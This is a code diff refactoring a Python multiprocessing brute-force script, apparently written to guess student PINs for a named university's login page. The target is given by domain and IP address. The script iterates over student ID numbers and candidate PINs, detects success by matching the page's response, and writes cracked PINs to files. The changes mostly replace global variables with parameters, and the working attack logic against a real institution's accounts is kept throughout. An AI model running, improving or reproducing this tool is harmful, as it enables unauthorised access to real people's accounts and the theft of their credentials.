@@ -8,20 +8,6 @@ import logging          # logging
 import os               # os.remove
 
 
-def init_global_argument(args):
-    global MAX_RETRY
-    global PROCESS_COUNT
-    global URL
-    global OK_TXT
-
-    MAX_RETRY = args.retry
-    PROCESS_COUNT = args.process
-
-    # URL = "http://sion.stikom-bali.ac.id/load_login.php"
-    URL = "http://180.250.7.188/load_login.php"
-    OK_TXT = """<script language="JavaScript1.2">document.getElementById('usern').style.backgroundColor='#F3F3F3';document.getElementById('passw').style.backgroundColor='#F3F3F3'</script><div id="divTarget">Success </div><script language="javascript">window.location ='/reg/'</script>"""
-
-
 def init_logging():
     logFormatter = logging.Formatter(
         fmt="[%(asctime)s][%(levelname)s] %(message)s",
@@ -77,40 +63,38 @@ def init_dictionary(nim="160000000"):
     return dictionary
 
 
-def login(pin, depth=0):
-    global URL
-    global OK_TXT
-    global SHARED
-    global NIM
-    global MAX_RETRY
+def login(nim, pin, found, counter, depth=0):
+    """Login into specified URL inside this function.
+    Please edit the target and success message
+    in this function declarataion as needed
+    """
+    URL = "http://180.250.7.188/load_login.php"
+    OK_TXT = """<script language="JavaScript1.2">document.getElementById('usern').style.backgroundColor='#F3F3F3';document.getElementById('passw').style.backgroundColor='#F3F3F3'</script><div id="divTarget">Success </div><script language="javascript">window.location ='/reg/'</script>"""
+    MAX_RETRY = 4   # please edit this if you need more retry
 
-    if not SHARED.found:
+    if not found.value:
         try:
             with requests.Session() as s:
-                data = {"usern": NIM, "passw": pin}
+                data = {"usern": nim, "passw": pin}
                 r = s.post(URL, data=data).text
             if r == OK_TXT:
-                SHARED.found = True
+                found.value = True
                 return pin
         except (requests.ConnectTimeout, requests.ConnectionError):
             logging.warning(
                 'Connection Problem occured, {} of {} retries'.format(depth, MAX_RETRY))
             if depth < MAX_RETRY:
                 depth += 1
-                return login(pin, depth=depth)
+                return login(nim, pin, found, counter, depth)
+        finally:
+            counter.value += 1
 
 
-def brute(nim):
-    global PROCESS_COUNT
-    global SHARED
-    global NIM
-
+def brute(nim, process_count):
     start_time = time.time()
-    logging.info('Trying for {} '.format(nim))
-
-    NIM = nim
-    SHARED = multiprocessing.Manager().Namespace()
-    SHARED.found = False
+    logging.info('Start bruteforce for {} '.format(nim))
+    found = multiprocessing.Manager().Value('I', 0)
+    counter = multiprocessing.Manager().Value('I', 0)
 
     # check saved pin first
     try:
@@ -121,7 +105,7 @@ def brute(nim):
     except FileNotFoundError:
         pass
     else:
-        result = login(pin)
+        result = login(nim, pin, found, counter)
         if result == pin:
             logging.info('Saved pin is good.')
             return
@@ -130,8 +114,9 @@ def brute(nim):
             os.remove(filename)
 
     dictionary = init_dictionary(nim)
-    with multiprocessing.Pool(PROCESS_COUNT) as pool:
-        result = list(pool.map(login, dictionary))
+    with multiprocessing.Pool(process_count) as pool:
+        result = list(pool.starmap(
+            login, [[nim, pin, found, counter] for pin in dictionary]))
 
     result = list(set(result))
     result.remove(None)
@@ -140,10 +125,10 @@ def brute(nim):
     if len(result) == 1:
         with open('found/{}'.format(nim), 'w') as logfile:
             logfile.write(result[0])
-            logging.info('Found %s %s' % (NIM, result[0]))
+            logging.info('Found %s %s' % (nim, result[0]))
     else:
-        logging.info('Failed %s' % (NIM))
-    logging.info("Finished %s in %.2fs" % (NIM, total_time))
+        logging.info('Failed %s' % (nim))
+    logging.info("Finished %s in %.2fs" % (nim, total_time))
 
 
 def parse_argument():
@@ -181,11 +166,8 @@ def parse_argument():
 
 
 def main():
-    global PROCESS_COUNT
-    args = parse_argument()
-
     init_logging()
-    init_global_argument(args)
+    args = parse_argument()
 
     # parse and gather all target
     target = []
@@ -195,7 +177,7 @@ def main():
             with open(args.infile, 'r') as filetarget:
                 target += filetarget.read().split(' ')
         except FileNotFoundError:
-            logging.warning('Logfile not found.')
+            logging.warning('Input file not found.')
     if args.target:
         target += args.target
     if args.range:
@@ -204,12 +186,12 @@ def main():
         logging.critical('Target is empty!')
         exit(1)
 
-    logging.info("Starting bruteforce with {} processes for {} target(s)".format(
-        PROCESS_COUNT, len(target)))
+    logging.info("Starting bruteforce with {} process(es) for {} target(s)".format(
+        args.process, len(target)))
 
     try:
         for nim in target:
-            brute(nim=nim)
+            brute(nim=nim, process_count=args.process)
             done.append(nim)
             gc.collect()
     except KeyboardInterrupt:
